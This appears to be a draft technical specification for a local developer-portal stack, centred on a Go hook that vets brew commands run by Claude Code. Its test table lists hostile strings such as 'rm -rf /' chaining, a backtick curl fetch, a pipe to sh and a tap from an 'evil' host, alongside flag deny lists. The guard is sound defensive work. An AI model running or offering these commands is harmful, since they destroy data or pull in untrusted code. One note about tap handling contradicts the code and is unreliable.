# M1 Substrate -- Technical Specification

> **Milestone:** M1 -- Substrate
> **Version:** 1.0
> **Date:** 2026-04-09
> **Status:** Draft, awaiting user approval
> **Companion docs:** [requirements.md](./requirements.md), [design-specification.md](./design-specification.md)

---

## 1. Purpose

This document is the low-level implementation reference. It captures every piece of concrete information an engineer needs to implement M1 without having to make design decisions: exact file paths, exact module layouts, exact dependency versions, exact API schemas, exact commands, exact config blocks.

If you find yourself making a design decision while reading this document, something is wrong -- stop and check the Design Specification. If the answer is not there either, escalate before implementing.

## 2. Repository layout (complete)

```
/Users/nnos/Projects/developer-portal/
+-- .gitignore
+-- LICENSE                                 # MIT
+-- README.md                               # operator-facing, <300 words
+-- docs/
|   +-- specs/
|   |   +-- m1-substrate/
|   |       +-- requirements.md
|   |       +-- design-specification.md
|   |       +-- technical-specification.md  # this file
|   +-- superpowers/
|       +-- plans/
|           +-- 2026-04-09-m1-substrate.md  # implementation plan (later phase)
+-- plugins/
|   +-- rr-policy-guards/
|       +-- plugin.json
|       +-- README.md
|       +-- .gitignore
|       +-- hooks/
|       |   +-- hooks.json
|       +-- tools/
|       |   +-- emoji-guard/                # non-ASCII file write blocker
|       |   +-- bash-guard/                 # bare $VAR blocker + corrector
|       |   +-- brew-guard/                 # brew supply-chain guard
|       |       +-- go.mod
|       |       +-- main.go
|       |       +-- main_test.go
|       |       +-- parser.go
|       |       +-- parser_test.go
|       |       +-- audit.go
|       +-- bin/                            # build output, gitignored
|           +-- rr-emoji-guard
|           +-- rr-bash-guard
|           +-- rr-brew-guard
+-- scripts/
|   +-- install-m1.sh                       # top-level orchestration
|   +-- teardown-m1.sh                      # reverse
|   +-- lib/                                # sourced helpers
|   |   +-- colors.sh                       # color output helpers
|   |   +-- wait-for.sh                     # wait for k8s resource ready
|   |   +-- confirm.sh                      # confirmation prompt helpers
|   +-- README.md
+-- backstage/                              # scaffolded in Task 4; gitignored at first, committed after configure
    +-- (scaffold produced by @backstage/create-app)
    +-- app-config.yaml                     # patched with gitea + openchoreo entries
    +-- (many other files produced by scaffold)
```

## 3. Dependency versions (pinned)

### 3.1 Host tools (already installed per Requirements Section 6)

No version changes in this document. Versions verified during the session preceding M1:

```
Go         1.26.2
Node.js    25.9.0
yarn       (install during Task 0.5)
k3d        5.8.3
kubectl    1.35.3
helm       3.20.1
kubebuilder 4.13.1
colima     (already running)
docker CLI 29.4.0
```

### 3.2 brew guard dependencies

**Go stdlib only. Zero external dependencies.** This is enforced by having no `require` block in `go.mod` beyond the Go version declaration.

```go
// tools/rr-brew-guard/go.mod
module github.com/nnos/developer-portal/tools/rr-brew-guard

go 1.21
```

Rationale: a security-critical hook with zero dependencies has zero supply-chain attack surface of its own. `encoding/json`, `strings`, `regexp`, `os`, `fmt`, `io`, `path/filepath`, `time` -- all stdlib -- cover every need.

### 3.3 OpenChoreo version pinning

OpenChoreo is consumed as an external project via its `make quick-start.dev` target. We pin to the git SHA currently checked out in the operator's `/Users/nnos/Projects/openchoreo` working tree, which as of 2026-04-09 is whatever `git -C /Users/nnos/Projects/openchoreo rev-parse HEAD` reports. The install script captures this SHA into `openchoreo-version.lock` at install time and fails loudly if a subsequent re-install sees a different SHA without explicit operator confirmation.

### 3.4 Gitea helm chart version

```
repo:    gitea-charts
URL:     https://dl.gitea.com/charts/
chart:   gitea-charts/gitea
version: 12.5.0  (or latest minor within 12.x when M1 ships)
```

Pinned in `scripts/install-m1.sh` as `GITEA_CHART_VERSION=12.5.0`.

### 3.5 Backstage scaffold version

Invoked via `npx @backstage/create-app@latest`. Because Backstage's create-app tool auto-pins the scaffolded app to the current Backstage release, the produced `package.json` will contain exact versions at scaffold time. Those versions are committed to the repo along with the scaffold. Backstage upgrades are their own future task and not M1 scope.

### 3.6 Backstage plugins added during M1

```
@backstage/plugin-catalog-backend-module-gitea   # official Gitea discovery
```

One plugin. No more. Other integrations are later milestones.

## 4. brew guard implementation details

### 4.1 Module structure

```
tools/rr-brew-guard/
+-- go.mod              # module declaration + Go version
+-- main.go             # entrypoint: reads stdin, calls parser, handles exit
+-- parser.go           # brewCommand tokenizer + validateBrewCommand
+-- audit.go            # AuditWriter: append JSONL to audit log
+-- main_test.go        # integration tests via stdin piping
+-- parser_test.go      # pure-function parser unit tests
+-- audit_test.go       # audit log tests against a tmp file
```

### 4.2 Core types

```go
// parser.go

// Decision is the outcome of validating a brew command.
type Decision struct {
    Allow  bool
    Reason string   // empty when Allow=true; human-readable cause when Allow=false
    Action string   // one of: "allow", "block", "bypass", "not-applicable"
}

// ToolInput mirrors the shape Claude Code's PreToolUse hook passes on stdin.
type ToolInput struct {
    ToolName  string            `json:"tool_name"`
    ToolInput ToolInputPayload  `json:"tool_input"`
    SessionID string            `json:"session_id,omitempty"`
}

type ToolInputPayload struct {
    Command     string `json:"command,omitempty"`
    Description string `json:"description,omitempty"`
}
```

### 4.3 Core functions and signatures

```go
// parser.go

// AllowedFlags is the exact set of brew flags permitted on install/reinstall/upgrade.
var AllowedFlags = map[string]struct{}{
    "--quiet":          {},
    "--no-auto-update": {},
    "--formula":        {},
    "--cask":           {},
}

// DangerousFlags is the enumerated rejection list for fast paths.
var DangerousFlags = map[string]struct{}{
    "--force":              {},
    "--HEAD":               {},
    "--debug-symbols":      {},
    "--build-from-source":  {},
}

// AllowedTaps is the allow-list of trusted third-party taps. Default is empty,
// meaning `brew tap` is blocked by default; adding a tap requires explicit
// code review. homebrew/core is the built-in default tap -- it is never the
// subject of a `brew tap` command, so it does not need to appear here.
var AllowedTaps = map[string]struct{}{
    // intentionally empty -- override by code change with PR review
}

// urlPattern matches http/https/git URL prefixes.
var urlPattern = regexp.MustCompile(`^(https?|git)://`)

// shellMeta matches characters that could chain commands.
// Excluded: space, tab, newline, normal arg characters.
var shellMeta = regexp.MustCompile("[;&|<>`$()]")

// packageNamePattern is the regex safe package names must match.
var packageNamePattern = regexp.MustCompile(`^[a-z0-9][a-z0-9_-]*(@[0-9.]+)?$`)

// tapNamePattern is the regex tap names must match (owner/tapname form).
var tapNamePattern = regexp.MustCompile(`^[a-z0-9][a-z0-9-]*/[a-z0-9][a-z0-9-]*$`)

// Tokenize splits a brew command into tokens respecting single and double quotes.
// Returns an error if quoting is malformed.
func Tokenize(cmd string) ([]string, error)

// ValidateBrewCommand applies the decision tree to a tokenized command.
// It is a pure function -- no I/O, no side effects.
func ValidateBrewCommand(tokens []string) Decision
```

### 4.4 Entrypoint flow

```go
// main.go

func main() {
    // 1. Read stdin as JSON
    var input ToolInput
    if err := json.NewDecoder(os.Stdin).Decode(&input); err != nil {
        // Unparseable input = unknown tool shape. Fail closed (block).
        logAudit("block", "unparseable-input", "", input.SessionID)
        fmt.Fprintln(os.Stderr, "brew-guard: unable to parse PreToolUse input")
        os.Exit(2)
    }

    // 2. Only inspect Bash tool invocations
    if input.ToolName != "Bash" {
        os.Exit(0) // not our concern
    }

    // 3. Only inspect brew commands
    tokens, err := Tokenize(input.ToolInput.Command)
    if err != nil {
        // Malformed shell quoting = refuse rather than guess
        logAudit("block", "tokenize-error: "+err.Error(), input.ToolInput.Command, input.SessionID)
        fmt.Fprintln(os.Stderr, "brew-guard: malformed command, refusing to evaluate")
        os.Exit(2)
    }
    if len(tokens) == 0 || tokens[0] != "brew" {
        os.Exit(0) // not a brew command, not our concern
    }

    // 4. Validate the brew command
    decision := ValidateBrewCommand(tokens)

    // 5. Handle bypass
    if !decision.Allow && os.Getenv("RR_BREW_GUARD_BYPASS") == "1" {
        logAudit("bypass", decision.Reason, input.ToolInput.Command, input.SessionID)
        fmt.Fprintln(os.Stderr, "brew-guard: bypass in effect (RR_BREW_GUARD_BYPASS=1)")
        os.Exit(0)
    }

    // 6. Log and exit
    if decision.Allow {
        // Log allows too, for full audit trail
        logAudit("allow", "", input.ToolInput.Command, input.SessionID)
        os.Exit(0)
    }

    logAudit("block", decision.Reason, input.ToolInput.Command, input.SessionID)
    fmt.Fprintf(os.Stderr, "brew-guard: blocked -- %s\n", decision.Reason)
    os.Exit(2)
}
```

### 4.5 ValidateBrewCommand decision tree

```go
// parser.go

func ValidateBrewCommand(tokens []string) Decision {
    if len(tokens) < 2 {
        return Decision{Allow: false, Reason: "empty brew command", Action: "block"}
    }

    sub := tokens[1]

    // `brew tap` is specially handled: only explicitly allow-listed taps
    // are permitted. By default the allow-list is empty.
    if sub == "tap" {
        return validateTapCommand(tokens[2:])
    }

    // Non-install subcommands beyond tap are read-only and always safe.
    if sub != "install" && sub != "reinstall" && sub != "upgrade" {
        return Decision{Allow: true, Action: "allow"}
    }

    // Scan arguments after the subcommand
    args := tokens[2:]
    sawPositional := false
    for _, a := range args {
        // URL-based installs are a supply-chain risk
        if urlPattern.MatchString(a) {
            return Decision{Allow: false, Reason: "url-based install: " + a, Action: "block"}
        }

        // Shell metacharacters suggest injection or command chaining
        if shellMeta.MatchString(a) {
            return Decision{Allow: false, Reason: "shell metacharacter in arg: " + a, Action: "block"}
        }

        if strings.HasPrefix(a, "--") {
            // Dangerous flags: explicit block with a clear reason
            if _, bad := DangerousFlags[a]; bad {
                return Decision{Allow: false, Reason: "disallowed flag: " + a, Action: "block"}
            }
            // Allowed flags: continue
            if _, ok := AllowedFlags[a]; ok {
                continue
            }
            // Unknown flags: block by default (deny-list-with-conservative-fallback)
            return Decision{Allow: false, Reason: "unknown flag: " + a, Action: "block"}
        }

        // Positional args: must be a valid package name
        if !packageNamePattern.MatchString(a) {
            return Decision{Allow: false, Reason: "suspicious package name: " + a, Action: "block"}
        }
        sawPositional = true
    }

    if !sawPositional {
        return Decision{Allow: false, Reason: "no package name provided", Action: "block"}
    }

    return Decision{Allow: true, Action: "allow"}
}

// validateTapCommand applies the tap-specific rules.
//
//   - No arguments -> `brew tap` with no args lists taps -> allow.
//   - URL argument -> block (URL-based taps are the classic supply-chain risk).
//   - Any tap name not on AllowedTaps -> block.
//   - Shell metacharacters anywhere -> block.
func validateTapCommand(args []string) Decision {
    if len(args) == 0 {
        return Decision{Allow: true, Action: "allow"} // `brew tap` alone lists current taps
    }
    for _, a := range args {
        if shellMeta.MatchString(a) {
            return Decision{Allow: false, Reason: "shell metacharacter in tap arg: " + a, Action: "block"}
        }
        if urlPattern.MatchString(a) {
            return Decision{Allow: false, Reason: "url-based tap: " + a, Action: "block"}
        }
        // Allow common safe flags
        if a == "--force-auto-update" || a == "--quiet" {
            continue
        }
        if strings.HasPrefix(a, "--") {
            return Decision{Allow: false, Reason: "disallowed tap flag: " + a, Action: "block"}
        }
        if !tapNamePattern.MatchString(a) {
            return Decision{Allow: false, Reason: "malformed tap name: " + a, Action: "block"}
        }
        if _, ok := AllowedTaps[a]; !ok {
            return Decision{Allow: false, Reason: "tap not on allow-list: " + a, Action: "block"}
        }
    }
    return Decision{Allow: true, Action: "allow"}
}
```

### 4.6 Tokenize implementation

```go
// parser.go

// Tokenize splits *cmd* into tokens, respecting single and double quotes.
// Backslash escapes are supported inside double quotes only.
// Returns an error if a quote is unterminated.
func Tokenize(cmd string) ([]string, error) {
    var tokens []string
    var cur strings.Builder
    inSingle := false
    inDouble := false
    escape := false
    for i := 0; i < len(cmd); i++ {
        c := cmd[i]
        switch {
        case escape:
            cur.WriteByte(c)
            escape = false
        case c == '\\' && inDouble:
            escape = true
        case c == '\'' && !inDouble:
            inSingle = !inSingle
        case c == '"' && !inSingle:
            inDouble = !inDouble
        case (c == ' ' || c == '\t') && !inSingle && !inDouble:
            if cur.Len() > 0 {
                tokens = append(tokens, cur.String())
                cur.Reset()
            }
        default:
            cur.WriteByte(c)
        }
    }
    if inSingle || inDouble {
        return nil, fmt.Errorf("unterminated quote")
    }
    if cur.Len() > 0 {
        tokens = append(tokens, cur.String())
    }
    return tokens, nil
}
```

### 4.7 Audit log implementation

```go
// audit.go

type AuditEvent struct {
    Timestamp string `json:"ts"`
    Action    string `json:"action"`  // "allow" | "block" | "bypass"
    Reason    string `json:"reason,omitempty"`
    Command   string `json:"command,omitempty"`
    Session   string `json:"session,omitempty"`
}

func logAudit(action, reason, command, session string) {
    path := os.Getenv("RR_BREW_GUARD_AUDIT_LOG")
    if path == "" {
        home, err := os.UserHomeDir()
        if err != nil {
            return // best-effort; logging must not block
        }
        path = filepath.Join(home, ".rational-reserve", "logs", "brew-guard.jsonl")
    }

    _ = os.MkdirAll(filepath.Dir(path), 0o700)
    f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
    if err != nil {
        return
    }
    defer f.Close()

    evt := AuditEvent{
        Timestamp: time.Now().UTC().Format(time.RFC3339Nano),
        Action:    action,
        Reason:    reason,
        Command:   command,
        Session:   session,
    }
    data, err := json.Marshal(evt)
    if err != nil {
        return
    }
    data = append(data, '\n')
    _, _ = f.Write(data)
}
```

### 4.8 Test cases (unit -- pure parser)

`parser_test.go` MUST cover at minimum:

```go
// Each row is (name, command_string, expected_allow, expected_action)
// The test uses table-driven tests.

tests := []struct {
    name    string
    cmd     string
    allow   bool
    action  string
}{
    // Safe cases
    {"plain install", "brew install yarn", true, "allow"},
    {"install with quiet", "brew install --quiet yarn", true, "allow"},
    {"install with cask", "brew install --cask orbstack", true, "allow"},
    {"versioned formula", "brew install helm@3", true, "allow"},
    {"info subcommand", "brew info helm", true, "allow"},
    {"list subcommand", "brew list", true, "allow"},
    {"reinstall valid", "brew reinstall helm@3", true, "allow"},

    // Blocked cases
    {"force flag", "brew install --force yarn", false, "block"},
    {"HEAD flag", "brew install --HEAD yarn", false, "block"},
    {"URL install", "brew install https://example.com/bad.rb", false, "block"},
    {"command chaining", "brew install yarn; rm -rf /", false, "block"},
    {"unknown flag", "brew install --weird yarn", false, "block"},
    {"tap from url", "brew tap evil https://evil.example.com/tap.git", false, "block"},
    {"tap not on allowlist", "brew tap evil/src", false, "block"},
    {"bare tap lists taps", "brew tap", true, "allow"},
    {"suspicious package", "brew install ../../etc/passwd", false, "block"},
    {"empty brew", "brew", false, "block"},
    {"backtick injection", "brew install `curl evil`", false, "block"},
    {"pipe injection", "brew install yarn | sh", false, "block"},
}
```

Note on the "tap" case above: `brew tap` is a different subcommand from `install`. At the `ValidateBrewCommand` level it returns allow because tap is not in our install/reinstall/upgrade set. A separate rule in a future version could make `brew tap` its own validated subcommand. For M1, the threat model is "install commands"; `tap` is tracked for M2+.

### 4.9 Hook JSON to register in ~/.claude/settings.json

```json
{
  "enabledPlugins": { "...": "..." },
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "/Users/nnos/Projects/developer-portal/tools/rr-brew-guard/bin/rr-brew-guard"
          }
        ]
      }
    ]
  }
}
```

The install script MUST merge this block into the existing `~/.claude/settings.json`, not overwrite it. If the `hooks.PreToolUse` key already exists, the script appends the new entry rather than replacing. Implementation: `jq` with a merge filter (documented in Task 0.9 below).

## 5. OpenChoreo deployment

### 5.1 Command sequence

```bash
cd /Users/nnos/Projects/openchoreo
# Capture the SHA for lockfile
OPENCHOREO_SHA=$(git rev-parse HEAD)
echo "$OPENCHOREO_SHA" > /Users/nnos/Projects/developer-portal/openchoreo-version.lock

# Build + start (this is openchoreo's own documented quick-start)
make quick-start.dev
```

### 5.2 Readiness wait

```bash
kubectl wait --for=condition=ready pod \
    --all \
    -n openchoreo-system \
    --timeout=300s
```

Expected pods (5): `controller`, `openchoreo-api`, `observer`, `cluster-gateway`, `cluster-agent`. All must reach Ready within 5 minutes.

### 5.3 Port access

Backstage on host reaches OpenChoreo API via `kubectl port-forward`:

```bash
kubectl port-forward -n openchoreo-system svc/openchoreo-api 8081:8080 &
OPENCHOREO_PORTFORWARD_PID=$!
```

Port 8081 (not 8080) on host to avoid collision with potential other local services. The install script tracks the PID and teardown kills it.

## 6. Gitea deployment

### 6.1 Helm repo + install

```bash
helm repo add gitea-charts https://dl.gitea.com/charts/
helm repo update gitea-charts

kubectl create namespace gitea

helm install gitea gitea-charts/gitea \
    --namespace gitea \
    --version 12.5.0 \
    --values /Users/nnos/Projects/developer-portal/scripts/gitea-values.yaml \
    --wait \
    --timeout 10m
```

### 6.2 gitea-values.yaml

```yaml
# scripts/gitea-values.yaml
gitea:
  admin:
    existingSecret: gitea-admin-secret   # created by install script, see Section 6.3
  config:
    server:
      ROOT_URL: http://localhost:3002/
      HTTP_PORT: 3000
    service:
      DISABLE_REGISTRATION: true
persistence:
  enabled: true
  size: 5Gi
postgresql-ha:
  enabled: false
postgresql:
  enabled: true
  persistence:
    enabled: true
    size: 5Gi
memcached:
  enabled: true
service:
  http:
    type: ClusterIP    # in-cluster only; host access is via kubectl port-forward
    port: 3000
```

Rationale:
- `DISABLE_REGISTRATION: true` -- admin-only user creation for M1
- Built-in Postgres + memcached -- no external infra
- `ClusterIP` (not NodePort) -- host reaches Gitea via `kubectl port-forward`, symmetric with how Section 5.3 reaches OpenChoreo. This keeps M1 independent of whatever k3d port mapping `make quick-start.dev` happens to configure.
- 5 Gi PVCs -- enough for M1 demo work

### 6.2.1 Port forwarding to Gitea

After the helm install, the script starts a background `kubectl port-forward`:

```bash
kubectl port-forward -n gitea svc/gitea-http 3002:3000 &
GITEA_PORTFORWARD_PID=$!
echo "$GITEA_PORTFORWARD_PID" > ~/.rational-reserve/m1-gitea-portforward.pid
```

Port 3002 on host -> Gitea's service port 3000. The teardown script kills this PID. The `ROOT_URL` in the Gitea config above points at `localhost:3002` to match.

### 6.3 Admin secret creation

```bash
# Before helm install, create the admin secret
GITEA_ADMIN_PASSWORD=$(openssl rand -base64 24 | tr -d '=+/' | head -c 24)
echo "$GITEA_ADMIN_PASSWORD" > ~/.rational-reserve/m1-gitea-admin-password
chmod 600 ~/.rational-reserve/m1-gitea-admin-password

kubectl create secret generic gitea-admin-secret \
    --namespace gitea \
    --from-literal=username=gitea_admin \
    --from-literal=password="$GITEA_ADMIN_PASSWORD" \
    --from-literal=email=admin@local.dev
```

### 6.4 Demo repo creation

After Gitea is healthy, the install script creates a demo repo via the API:

```bash
GITEA_TOKEN=$(curl -s -u "gitea_admin:${GITEA_ADMIN_PASSWORD}" \
    -X POST http://localhost:3002/api/v1/users/gitea_admin/tokens \
    -H "Content-Type: application/json" \
    -d '{"name": "m1-install-script", "scopes": ["write:repository", "write:admin"]}' \
    | jq -r .sha1)

curl -s -u "gitea_admin:${GITEA_ADMIN_PASSWORD}" \
    -X POST http://localhost:3002/api/v1/user/repos \
    -H "Content-Type: application/json" \
    -d '{
      "name": "demo-service",
      "description": "M1 demo component for Backstage catalog discovery",
      "private": false,
      "auto_init": true,
      "default_branch": "main"
    }'

# Push catalog-info.yaml via the contents API
CATALOG_YAML='apiVersion: backstage.io/v1alpha1
kind: Component
metadata:
  name: demo-service
  description: M1 smoke-test component
spec:
  type: service
  lifecycle: experimental
  owner: gitea_admin'

CATALOG_B64=$(printf '%s' "$CATALOG_YAML" | base64)

curl -s -u "gitea_admin:${GITEA_ADMIN_PASSWORD}" \
    -X POST "http://localhost:3002/api/v1/repos/gitea_admin/demo-service/contents/catalog-info.yaml" \
    -H "Content-Type: application/json" \
    -d "{\"message\": \"M1 seed catalog entry\", \"content\": \"${CATALOG_B64}\", \"branch\": \"main\"}"
```

Token is stored in `~/.rational-reserve/m1-gitea-token` with mode 0600 for Backstage to read later.

## 7. Backstage scaffold + configuration

### 7.1 Scaffold command

```bash
cd /Users/nnos/Projects/developer-portal
npx --yes @backstage/create-app@latest --path ./backstage --skip-install
```

`--skip-install` lets us scaffold first, commit the skeleton, then run `yarn install` as a separate step. Rationale: the scaffold itself should land in git cleanly before ~2 GB of node_modules pollutes the working tree.

### 7.2 yarn install

```bash
cd /Users/nnos/Projects/developer-portal/backstage
corepack enable
yarn install
```

`corepack enable` lets Node.js 25's built-in corepack manage yarn 4 automatically.

### 7.3 Install Gitea plugin

```bash
cd /Users/nnos/Projects/developer-portal/backstage/packages/backend
yarn add @backstage/plugin-catalog-backend-module-gitea
```

### 7.4 app-config.yaml patches

The scaffold produces a default `backstage/app-config.yaml`. The install script applies the following patches via `yq` (pinned via brew, already in Requirements):

```yaml
# Added to integrations
integrations:
  gitea:
    - host: localhost:3002
      username: gitea_admin
      password: ${GITEA_ADMIN_PASSWORD}

# Added to catalog
catalog:
  providers:
    gitea:
      default:
        host: localhost:3002
        organization: gitea_admin
        schedule:
          frequency: { minutes: 5 }
          timeout: { minutes: 3 }

# Added to proxy
proxy:
  endpoints:
    '/openchoreo':
      target: http://localhost:8081
      changeOrigin: true
      pathRewrite:
        '^/api/proxy/openchoreo': ''
```

The `${GITEA_ADMIN_PASSWORD}` is sourced from the host environment at Backstage startup -- Backstage reads `process.env` for `${...}` references.

### 7.5 Gitea plugin registration in backend

```typescript
// backstage/packages/backend/src/index.ts -- additions

import { giteaEntityProviderCatalogModule } from '@backstage/plugin-catalog-backend-module-gitea';
// ...
backend.add(giteaEntityProviderCatalogModule);
```

Exact line number depends on the scaffold version and will be set at install time by a small sed/patch script. The Implementation Plan (produced next) will contain the exact patch operation.

### 7.6 Run Backstage

```bash
cd /Users/nnos/Projects/developer-portal/backstage

export GITEA_ADMIN_PASSWORD=$(cat ~/.rational-reserve/m1-gitea-admin-password)
yarn dev &
BACKSTAGE_DEV_PID=$!
```

`yarn dev` runs the Backstage frontend at `http://localhost:3000` and the backend at `http://localhost:7007`. The install script writes the PID to `~/.rational-reserve/m1-backstage-dev.pid` for teardown.

## 8. Install script structure

```bash
#!/usr/bin/env bash
# scripts/install-m1.sh

set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$ROOT/scripts/lib/colors.sh"
source "$ROOT/scripts/lib/wait-for.sh"
source "$ROOT/scripts/lib/confirm.sh"

mkdir -p "$HOME/.rational-reserve/logs"

info() { printf "\033[1;36m[m1-install]\033[0m %s\n" "$*"; }
fail() { printf "\033[1;31m[m1-install ERROR]\033[0m %s\n" "$*" >&2; exit 1; }

# -----------------------------------------------------------------------------
# Task 0: Build and register the brew guard hook
# -----------------------------------------------------------------------------
task_0_brew_guard() {
    info "Task 0: building rr-brew-guard"
    cd "$ROOT/tools/rr-brew-guard"
    go test ./... || fail "brew guard tests failed"
    go build -o bin/rr-brew-guard .
    test -x bin/rr-brew-guard || fail "brew guard binary not built"
    info "Task 0: registering PreToolUse hook in ~/.claude/settings.json"
    "$ROOT/scripts/merge-hook-into-settings.sh"
}

# -----------------------------------------------------------------------------
# Task 0.5: brew install yarn (gated by the hook we just built)
# -----------------------------------------------------------------------------
task_0_5_yarn() {
    if command -v yarn >/dev/null 2>&1; then
        info "yarn already installed: $(yarn --version)"
        return 0
    fi
    info "Task 0.5: brew install yarn"
    brew install yarn
}

# -----------------------------------------------------------------------------
# Task 1-6: see Implementation Plan for details
# -----------------------------------------------------------------------------
task_1_openchoreo()    { ... }
task_2_gitea()         { ... }
task_3_demo_repo()     { ... }
task_4_backstage_scaffold() { ... }
task_5_backstage_config() { ... }
task_6_backstage_run() { ... }
task_7_smoke_test()    { ... }

main() {
    task_0_brew_guard
    task_0_5_yarn
    task_1_openchoreo
    task_2_gitea
    task_3_demo_repo
    task_4_backstage_scaffold
    task_5_backstage_config
    task_6_backstage_run
    task_7_smoke_test
    info "M1 complete. Backstage: http://localhost:3000  Gitea: http://localhost:3002"
}

main "$@"
```

The exact body of each task and its verification is the Implementation Plan's job.

## 9. Teardown script structure

```bash
#!/usr/bin/env bash
# scripts/teardown-m1.sh

set -uo pipefail  # no -e: we want best-effort cleanup even if some steps fail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

info() { printf "\033[1;36m[m1-teardown]\033[0m %s\n" "$*"; }

# Kill Backstage dev server if running
if [ -f ~/.rational-reserve/m1-backstage-dev.pid ]; then
    kill "$(cat ~/.rational-reserve/m1-backstage-dev.pid)" 2>/dev/null || true
    rm -f ~/.rational-reserve/m1-backstage-dev.pid
    info "backstage dev server stopped"
fi

# Kill kubectl port-forwards if running
pkill -f "kubectl port-forward.*openchoreo-api" 2>/dev/null || true
pkill -f "kubectl port-forward.*gitea-http" 2>/dev/null || true
rm -f ~/.rational-reserve/m1-gitea-portforward.pid

# Uninstall gitea
helm uninstall gitea -n gitea 2>/dev/null || true
kubectl delete namespace gitea --ignore-not-found

# Tear down k3d cluster (via openchoreo's own uninstall target)
if command -v k3d >/dev/null && k3d cluster list | grep -q developer-portal; then
    (cd /Users/nnos/Projects/openchoreo && make k3d.uninstall) || true
fi

# Remove the brew guard hook entry from settings.json
if [ -f ~/.claude/settings.json ]; then
    "$ROOT/scripts/remove-hook-from-settings.sh"
fi

# Do NOT delete the source tree, specs, or audit logs.
info "M1 torn down. Source tree and audit logs preserved."
```

## 10. Settings.json merge helper

A small helper script (`scripts/merge-hook-into-settings.sh`) uses `jq` to idempotently add the brew guard hook:

```bash
#!/usr/bin/env bash
set -euo pipefail

SETTINGS="$HOME/.claude/settings.json"
HOOK_CMD="/Users/nnos/Projects/developer-portal/tools/rr-brew-guard/bin/rr-brew-guard"

test -f "$SETTINGS" || echo '{}' > "$SETTINGS"

jq --arg cmd "$HOOK_CMD" '
  .hooks //= {} |
  .hooks.PreToolUse //= [] |
  if any(.hooks.PreToolUse[]; .matcher == "Bash" and (.hooks[]? | .command == $cmd))
  then .
  else .hooks.PreToolUse += [{
    "matcher": "Bash",
    "hooks": [{"type": "command", "command": $cmd}]
  }]
  end
' "$SETTINGS" > "$SETTINGS.tmp" && mv "$SETTINGS.tmp" "$SETTINGS"
```

The removal helper is symmetric and filters out the exact entry.

`jq` must be installed (prerequisite -- assume it is; flag in Implementation Plan if missing).

## 11. Test strategy

### 11.1 brew guard

- **Unit tests:** `parser_test.go` covers every row in Section 4.8. Runs in milliseconds, no I/O.
- **Audit tests:** `audit_test.go` writes to a tmp file, verifies JSONL output, verifies file permissions.
- **Integration test:** `main_test.go` pipes real JSON to the binary via `os/exec`, verifies exit codes and stderr messages. Runs after `go build`.
- **Manual smoke test:** running `brew install yarn` through Claude Code after hook registration -- this IS Task 0.5.

### 11.2 M1 substrate

- **Smoke test script:** `scripts/smoke-test-m1.sh` (produced as part of Task 7 in the Implementation Plan) performs each checklist item from Requirements Section 7 non-interactively and exits 0 if all pass, 1 otherwise.

## 12. Rollback strategy

The install script can be interrupted at any task boundary. Each task writes a marker file (`~/.rational-reserve/m1-progress/task-N.done`) on success. Re-running `install-m1.sh` picks up from the last successful task via a resume flag, or runs from scratch if `--fresh` is passed.

Full rollback is handled by `teardown-m1.sh` (Section 9).

## 13. Documentation requirements

Every file created by M1 MUST have:

- A header comment (Go: file-level comment; shell: block comment at top)
- A `README.md` if the file is the entrypoint of a subdirectory
- Cross-references to the three spec documents for non-obvious design choices

The `README.md` at the repository root is written last, after everything else works, and MUST be under 300 words as required by NFR-14.

## 14. What this document does not cover

Deliberately out of scope for the Technical Specification:

- Step-by-step TDD task ordering with checkboxes -> that is the Implementation Plan produced by `writing-plans` skill
- Exact commit messages for each change -> Implementation Plan
- Exact line-by-line patches to files produced by `npx @backstage/create-app` -> Implementation Plan (generated at scaffold time)
- Upgrade strategy for Backstage / OpenChoreo / Gitea -> M2 or later
- Observability instrumentation -> M3
- Auth integration -> M3+

## 15. Self-review checklist (for the engineer writing the Implementation Plan)

Before you produce the Implementation Plan from this document, verify:

- [ ] Every functional requirement in `requirements.md` maps to a concrete section of this document
- [ ] Every design decision in `design-specification.md` has a corresponding "here is how to implement it" section here
- [ ] Every file listed in `Section 2` has an unambiguous owner section
- [ ] Every dependency version is pinned
- [ ] Every API call has an example of the request body and expected response shape
- [ ] Every shell snippet is runnable from the documented directory with the documented prerequisites
- [ ] No section says "implement reasonable error handling" or any placeholder phrase
